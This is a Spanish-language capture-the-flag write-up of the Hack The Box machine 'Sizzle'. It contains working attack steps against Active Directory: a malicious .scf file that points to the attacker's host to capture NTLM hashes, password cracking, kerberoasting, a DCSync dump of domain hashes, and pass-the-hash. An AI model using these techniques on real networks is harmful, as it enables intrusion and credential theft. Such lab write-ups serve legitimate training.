---
redirect_from:
  - /posts/SIZZLE-WriteUp/

title: Sizzle - WriteUp
date: 'Mon, 09 Jun 2025 00:00:00 GMT'
categories:
  - WriteUps
  - HTB
  - Windows
tags:
  - ctf
  - nmap
  - htb
  - winrm
  - powershell
  - dcsync
  - evil-winrm
  - bash
  - smb
  - rpc
image: /assets/img/cabeceras/2025-06-09-SIZZLE-WRITEUP.png
description: >-
  Sizzle es una máquina de dificultad Insane bajo WIndows en un entorno de
  Active Directory. Un directorio, un recurso compartido de PYMES permite robar
  hashes NTLM que se pueden descifrar para acceder al Portal de Servicios de
  Certificados. Se puede crear un certificado autofirmado utilizando la CA y
  utilizado para PSRemoting. Un SPN asociado con un usuario permite un ataque de
  kerberoast en la caja. Se encuentra que el usuario tiene derechos de
  replicación que pueden ser abusados para obtener hashes de administrador a
  través de DCSync.
---

{% include machine-info.html
  machine="Sizzle"
  os="Windows"
  difficulty="Insane"
  platform="HTB"
%}


## ENUMERACIÓM

NMAP

```bash
# Nmap 7.94SVN scan initiated Sat Jan 13 10:36:20 2024 as: nmap -sCV -p 21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49669,49671,49687,49689,49692,49695,49713 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.13.149
Nmap scan report for 10.129.13.149
Host is up (0.046s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesnt have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2024-01-13T09:38:04+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2024-01-13T09:38:03+00:00; -1s from scanner time.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesnt have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2024-01-13T09:38:03+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2024-01-13T09:38:04+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2024-01-13T09:38:03+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-01-13T09:38:04+00:00; -1s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-13T09:37:26
|_  start_date: 2024-01-13T09:31:51
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Añadimos al hosts el nombre DNS de la máquina.

A continuación, mostramos tres formas de enumerar carpetas compartidas por SMB:

```bash
$ smbclient --no-pass -L //10.129.13.149/
...
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	Department Shares Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Operations      Disk      
	SYSVOL          Disk      Logon server share
```

```bash
$ smbmap -u null -p "" -H 10.129.13.149
...
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.129.16.146:445	Name: sizzle.htb.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Operations                                        	NO ACCESS	
	SYSVOL                                            	NO ACCESS	Logon server share
```

```bash
$ crackmapexec smb 10.129.13.149 -u 'guest' -p '' --spider 'Department Shares' --regex .
...
SMB         10.129.16.146   445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.16.146   445    SIZZLE           [+] HTB.LOCAL\guest: 
SMB         10.129.16.146   445    SIZZLE           [*] Started spidering
SMB         10.129.16.146   445    SIZZLE           [*] Spidering .
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/. [dir]
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/.. [dir]
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/Accounting [dir]
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/Audit [dir]
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/Banking [dir]
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/CEO_protected [dir]
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/Devops [dir]
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/Finance [dir]
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/HR [dir]
SMB         10.129.16.146   445    SIZZLE           //10.129.16.146/Department Shares/Infosec [dir]
...
```

Descubrimos un listado de posibles usuarios:
![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240113113110.png)

Los copiamos en un archivo tipo users.txt y lo pasamos por kerbrute para ver qué usuario son válidos:

```bash
$ kerbrute userenum --dc 10.129.13.149 -d htb.local users.txt
...
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/13/24 - Ronnie Flathers @ropnop

2024/01/13 11:29:52 >  Using KDC(s):
2024/01/13 11:29:52 >  	10.129.13.149:88

2024/01/13 11:29:52 >  [+] VALID USERNAME:	amanda@htb.local
2024/01/13 11:29:52 >  Done! Tested 12 usernames (1 valid) in 0.093 seconds
```

Según _kerbrute_ el único usuario válido es _amanda_.

Antes de continuar por otra vía podemos probar mediante el comando "smbcacls" en qué directorio(s) de estos usuario tenemos permisos de lectura/escritura. Para ello usaremos la siguiente sentencia:

```bash
$ smbcacls "//10.129.13.149/Department Shares" Users/amanda
...
Password for [WORKGROUP\andy]:
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
```

Tenemos que fijarnos en el permiso para "Everyone" en este caso concreto tenemos solo el permiso de lectura.

Para enumerar los permisos de todos los usuarios del archivo "users.txt" previamente creado, lo podemos hacer con un pequeño script en python.

```python
# Importamos el módulo os para ejecutar comandos del sistema
import os

# Ruta al archivo de texto con los nombres de usuario
archivo = "./users.txt"

# Abrimos el archivo y leemos cada línea
with open(archivo, 'r') as f:
    usuarios = f.read().splitlines()

# Para cada usuario en la lista de usuarios
for usuario in usuarios:
    # Imprimimos el nombre del usuario que estamos probando
    print(f"\nProbando el usuario: {usuario}")
    # Creamos el comando
    comando = f'smbcacls -N "//10.129.13.149/Department Shares" "Users/{usuario}"'
    # Ejecutamos el comando
    os.system(comando)
```

Pero vemos que todos los usuarios tienen el permiso ACL:Everyone:ALLOWED/OI|CI|I/READ en sus respectivas carpetas excepto el usuario _Public_.

```bash
$ python3 enum-users.py

Probando el usuario: Public
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
'ACL:Everyone:ALLOWED/OI|CI/FULL'
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
'ACL:Everyone:ALLOWED/OI|CI|I/READ'
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL

Probando el usuario: amanda
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
'ACL:Everyone:ALLOWED/OI|CI|I/READ'
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL

Probando el usuario: amanda_adm
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
'ACL:Everyone:ALLOWED/OI|CI|I/READ'
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
...
```

Como podemos escribir dentro de la carpeta "//Documents Shares/UsersPublic" vamos a montarnos el recurso compartido en nuestro equipo para operar mejor.

Nos ponemos como root y creamos una carpeta en /mnt que contendrá la montura, en mi caso la he llamado _sizzle_
```bash
$ sudo su
...
/mnt# mkdir sizzle
...
mount -t cifs "//10.129.13.149/Department Shares" /mnt/sizzle
```

Ahora ya podemos navegar entre carpetas desde nuestro equipo.

Ahora nuestro próximo objetivo será crea dentro de /Public un archivo malicioso que nos ayude a la explotación de la máquina.

## EXPLOTACIÓN

En este caso crearemos un archivo .scf de modo que cuando se ejecute desde la máquina remota intentará loguearse contra nuestra máquina y podremos capturar su hash de validación.

Para ello crearemos un archivo .scf con el siguiente contenido:

```scf
[Shell]
Command=2
IconFile=\\10.10.14.33\smbFolder\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Por otro lado nos pondremos en escucha creando un recurso compartido SMB en nuestra máquina que llamaremos _smbFolder_:

```bash
$ sudo impacket-smbserver smbFolder $(pwd) -smb2support
```

Moveremos el archivo .scf a la carpeta /Public y esperaremos la autenticación.

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116105434.png)

Pasados un minuto podremos ver el hash del usuario amanda:

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116105552.png)

```http
amanda::HTB:aaaaaaaaaaaaaaaa:2b3c9567563dcda00917d5160cb7d358:010100000000000080c19c0e6248da011a5fa09dcf8a45ef00000000010010004c0054006c006a006500770074005500030010004c0054006c006a006500770074005500020010006f006e007a00410042004b0055007100040010006f006e007a00410042004b00550071000700080080c19c0e6248da0106000400020000000800300030000000000000000100000000200000908323fd0d7fb750bb700afbfc971ef365e792327cd9799e5362d43411b667610a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0033003300000000000000000000000000
```

Lo copiamos en un archivo y le pasamos _john_

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt amanda-hash
```

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116105959.png)

Tenemos nuevas credenciales:

```http
amanda:Ashare1972
```

Ahora que tenemos credenciales válidas, vamos a ver qué usuarios son "kerberoasteables" :

```bash
$ impacket-GetUserSPNs 'htb.local/amanda:Ashare1972'

Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name   MemberOf                                               PasswordLastSet             LastLogon                   Delegation 
--------------------  -----  -----------------------------------------------------  --------------------------  --------------------------
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 20:08:09.536421  2018-07-12 16:23:50.871575     
```

Y vemos que ha encontrado al usuario _mrlky_

Pero no podemos solicitarlo porque el protocolo kerberos (88) no está expuesto.

Como tenemos el servicio LDAP expuesto podemos intentar seguir enumerando por ahí:

```bash
$ rpcclient -U 'amanda%Ashare1972' 10.129.118.228
...
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[amanda] rid:[0x450]
user:[mrlky] rid:[0x643]
user:[sizzler] rid:[0x644]

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44f]
...
```

También podemos usar _enum4linux_:

```bash
$ enum4linux -UMSPG -d -u htb.local/amanda -p Ashare1972 10.129.118.228
```

Descubrimos que Amanda pertenece al grupo de Administradores de Usuarios Remotos, pero por ahora no podemos acceder si no disponemos de un certificado válido:

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116130747.png)

También vemos que el usuario _sizzler_ pertenece al grupo de administradores. Sólo para tenerlo en cuenta.

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116115113.png)

Vamos a realizar fuzzing con un diccionario específico para IIS:

```bash
$ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt http://10.129.118.228/FUZZ
```

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116124202.png)

Y vemos una ruta con nombre _certsrv_

Vamos al navegador y vemos qué es:

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116124308.png)

Y nos sale un panel de login.

Probamos con las únicas credenciales que tenemos hasta ahora y vemos si tenemos acceso.

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116124457.png)

Y entramos en una página en la que podemos solicitar un certificado. Este nos podrá servidr para conectarnos remotamente por el servicio WinRM.

Pero antes vamos a crear un para de claves de nuestro lado para usuario _amanda_ de la siguiente forma:

```bash
$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

Pulsamos intro a todas las preguntas para dejarlo por defecto.

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116125250.png)

Y nos habré creado el par de calves que necesitamos:

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116125324.png)

Abrimos el archivo _amanda.csr_ y copiamos su contenido.

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116125619.png)

Ahora volvemos a la web y pinchamos sobre "Request a certificate" > "advanced certificate request"

Pegamos el contenido dentro de la caja "Saved Request" y pulsamos en "Submit"

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116125824.png)

Ahora pulsamos sobre "Download Certificate" y lo movemos a nustra ruta de trabajo donde tenemos los otros certificados generados:

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116130145.png)

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116130226.png)

Ahora que tenemos todos los certificados necesarios podemos conectar con ellos mediante _evil-winRM_ al puerto 5986 SSL con el usuario _amanda_, ya que como vimos anteriormente, pertenece al grupo de Administradores Remotos.

```bash
$ evil-winrm -S -c certnew.cer -k amanda.key -i 10.129.118.228 -u 'amanda' -p 'Ashare1972'
```

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116131124.png)

## ESCALADA

Llegados a este punto y como el usuario con el que hemos accedido no tiene la flag de user, deberemos seguir enumerando todo el contenido del AD. Para ello nos ayudaremos de la utilidad _BloodHound_, podemos correrla en la misma máquina ya que tenemos acceso (es lo recomendable) o desde nuestro equipo con el script de python _bloodhound-python_. En este caso nos será suficiente con el script de python. Nos creamos una carpeta de trabajo donde almacenaremos todos los archivos que recopile la utilidad lanzada de la siguiente manera:

```bash
$ bloodhound-python -u 'amanda' -p 'Ashare1972' -ns 10.129.118.228 -d htb.local -c all
```

![SIZZLE](/assets/img/htb-writeups/Pasted-image-20240116132647.png)

Una vez hemos recolectado la información iniciamos el servidor _neo4j_ y seguidamente _bloodhound_:

```bash
$ sudo neo4j start
$ bloodhound
```

Cargamos todos los archivos y empezamos a enumerar.

Dentro de la máquina ejecutamos Rubeus.exe

```PowerShell
> .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```

Esto nos dará el hash del usuario _mrlky_ que lo podremos romper con _john_

```http
mrlky:Football#7
```

Como el usuario tiene privilegios GetChanges podemos hacer un DCSync Attack:

```bash
$ impacket-secretsdump htb.local/mrlky:Football#7@10.129.118.228

Impacket v0.11.0 - Copyright 2023 Fortra
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:7f787ba36ac8795279f33a229627d464:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:c43219ed6bec796775199fa8b2d5acab072acb2b2fc28fefdd4c9f218711bf30
SIZZLE$:aes128-cts-hmac-sha1-96:917ef91090f4528c4bca07be0c8fd384
SIZZLE$:des-cbc-md5:021a2079585b3ef7
[*] Cleaning up... 
```

Y ahora con los hahses podemos hacer un pass the hash attack con el usuario Administrator:

```bash
$ impacket-wmiexec htb.local/Administrator@10.129.118.228 -hashes :f6b7160bfc91823792e0ac3a162c9267
```
---

**Última actualización**: 2025-06-09<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
